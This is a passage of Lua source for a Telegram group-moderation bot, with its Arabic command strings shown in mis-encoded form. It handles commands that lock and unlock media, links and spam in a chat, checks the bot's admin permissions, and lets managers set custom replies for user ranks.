ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Forwards'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
end
end
--     Source Escobar     --
if Admin(msg) then
if text and text:match("^ΩΨͺΨ­ (.*)$") then
local UnLockText = {string.match(text, "^(ΩΨͺΨ­) (.*)$")}
if UnLockText[2] == "Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" then
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω*")  
Devmfm:del(mustafa..'mfm:Lock:Text'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ΅ΩΨ±" then
if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±*")  
Devmfm:del(mustafa..'mfm:Lock:Photo'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΨ§ΩΨ΄" then
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄*")  
Devmfm:del(mustafa..'mfm:Lock:Spam'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ―Ψ?ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Join'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ―Ψ?ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΨ―ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΩ°Ψ―ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Videos'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΩΩ°Ψ―ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΩΨ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:Document'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ§ΩΩΩΨ§ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΩΨ§ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Inline'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ§ΩΩΩΨ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Markdown'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Gifs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ§ΨΊΨ§ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Music'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ΅ΩΨͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ*")  
Devmfm:del(mustafa..'mfm:Lock:Voice'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" then
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·*")  
Devmfm:del(mustafa..'mfm:Lock:Links'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΨ§ΩΨΉ" then
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨΉ*")  
Devmfm:del(mustafa..'mfm:Lock:Location'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΨ§ΩΨΉ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨΉΨ±Ω" or UnLockText[2] == "Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:Tags'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω" or UnLockText[2] == "Ψ§ΩΨͺΨ§Ω" then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω*")  
Devmfm:del(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ¬ΩΨ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:Contact'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨΉΨ±Ψ¨ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨΉΨ±Ψ¨ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Arabic'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨΉΨ±Ψ¨ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:English'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:TagServr'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ*")  
Devmfm:del(mustafa..'mfm:Lock:Stickers'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨͺΩΨ¬ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Forwards'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
end
end
--     Source Escobar     --
if text and text:match("^ΩΩΩ Ψ§ΩΨͺΩΩΩΨ΄$") or text and text:match("^ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ Ψ§ΩΩΨ΅ΩΩ$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md')
else
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΩΩΨ΄*")  
end
end
if text and text:match("^ΩΨͺΨ­ Ψ§ΩΨͺΩΩΩΨ΄$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md')
else
Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
Devmfm:del(mustafa..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΩΩΨ΄*")  
end
end
--     Source Escobar     --
if text and text:match("^ΩΩΩ Ψ§ΩΩΩ$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md')
else
Devmfm:del(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Lock:Taf'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) 
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'mfm:Lock:EditMsgs','mfm:Lock:Farsi','mfm:Lock:TagServr','mfm:Lock:Inline','mfm:Lock:Photo','mfm:Lock:Spam','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:Music','mfm:Lock:Voice','mfm:Lock:Links','mfm:Lock:Location','mfm:Lock:Tags','mfm:Lock:Stickers','mfm:Lock:Markdown','mfm:Lock:Forwards','mfm:Lock:Document','mfm:Lock:Contact','mfm:Lock:Hashtak','mfm:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±*")  
end
end
if text and text:match("^ΩΨͺΨ­ Ψ§ΩΩΩ$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md')
else
Devmfm:set(mustafa..'mfm:Lock:Fshar'..msg.chat_id_,true) Devmfm:set(mustafa..'mfm:Lock:Taf'..msg.chat_id_,true) Devmfm:set(mustafa..'mfm:Lock:Kfr'..msg.chat_id_,true) Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'mfm:Lock:EditMsgs','mfm:Lock:Text','mfm:Lock:Arabic','mfm:Lock:English','mfm:Lock:Join','mfm:Lock:Bots','mfm:Lock:Farsi','mfm:Lock:FarsiBan','mfm:Lock:TagServr','mfm:Lock:Inline','mfm:Lock:Photo','mfm:Lock:Spam','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:Music','mfm:Lock:Voice','mfm:Lock:Links','mfm:Lock:Location','mfm:Lock:Tags','mfm:Lock:Stickers','mfm:Lock:Markdown','mfm:Lock:Forwards','mfm:Lock:Document','mfm:Lock:Contact','mfm:Lock:Hashtak','mfm:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
Devmfm:del(mustafa..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±*")  
end
end
--     Source Escobar     --
if Admin(msg) then
if text and (text:match("^ΨΆΨΉ Ψ³Ψ¨Ψ§Ω (%d+)$") or text:match("^ΩΨΆΨΉ Ψ³Ψ¨Ψ§Ω (%d+)$")) then
local SetSpam = text:match("ΨΆΨΉ Ψ³Ψ¨Ψ§Ω (%d+)$") or text:match("ΩΨΆΨΉ Ψ³Ψ¨Ψ§Ω (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§Ψ?ΨͺΨ± ΨΉΨ―Ψ― Ψ§ΩΨ¨Ψ± ΩΩ 40 Ψ­Ψ±Ω ', 1, 'md')
else
Devmfm:set(mustafa..'mfm:Spam:Text'..msg.chat_id_,SetSpam)
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ¨Ψ§Ω β *'..SetSpam, 1, 'md')
end
end
end
--     Source Escobar     --
if Manager(msg) then
if text == "ΩΨ­Ψ΅" or text == "ΩΨ­Ψ΅ Ψ§ΩΨ¨ΩΨͺ" then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = 'βοΈ' else EDT = 'βοΈ' end
if GetInfo.result.can_delete_messages == true then DEL = 'βοΈ' else DEL = 'βοΈ' end
if GetInfo.result.can_invite_users == true then INV = 'βοΈ' else INV = 'βοΈ' end
if GetInfo.result.can_pin_messages == true then PIN = 'βοΈ' else PIN = 'βοΈ' end
if GetInfo.result.can_restrict_members == true then BAN = 'βοΈ' else BAN = 'βοΈ' end
if GetInfo.result.can_promote_members == true then VIP = 'βοΈ' else VIP = 'βοΈ' end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ ΩΩ β β₯‘\nββββ EB ββββ\nβ β« Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β '..DEL..'\nβ β« Ψ―ΨΉΩΨ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ β '..INV..'\nβ β« Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ β '..BAN..'\nβ β« ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β '..PIN..'\nβ β« ΨͺΨΊΩΩΨ± Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ β '..EDT..'\nβ β« Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω β '..VIP..'\nββββ EB ββββ', 1, 'md')
end end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") 
Devmfm:set(mustafa.."mfm:SudoBot:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― ΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― ΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") 
Devmfm:set(mustafa.."mfm:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") 
Devmfm:set(mustafa.."mfm:Constructor:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") 
Devmfm:set(mustafa.."mfm:Managers:Rd"..msg.chat_id_,Text) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") 
Devmfm:set(mustafa.."mfm:Admins:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") 
Devmfm:set(mustafa.."mfm:VipMem:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨΈΩ (.*)$") then
local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨΈΩ (.*)$") 
Devmfm:set(mustafa.."mfm:Cleaner:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨΈΩ Ψ§ΩΩ β "..Text, 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ’ΩΩΨΉΨΆΩΩΩΩ (.*)$") then
